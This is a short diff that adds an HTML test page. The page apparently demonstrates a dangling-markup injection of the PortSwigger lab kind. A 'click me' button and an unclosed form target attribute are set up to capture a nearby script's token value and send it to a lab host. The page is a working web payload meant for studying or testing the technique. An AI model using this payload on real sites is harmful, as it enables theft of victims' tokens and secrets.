@@ -1,0 +1,13 @@
+<input name=x type=hidden form=x
+    value="&lt;a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;"><button
+    form=x>
+    <font size=100 color=red>Click me</font>
+</button>
+<form id=x target="blah<b>test</b>
+
+<script>
+token = 'supersecret';
+</script>
+
+<form action=" blah">
+</form>
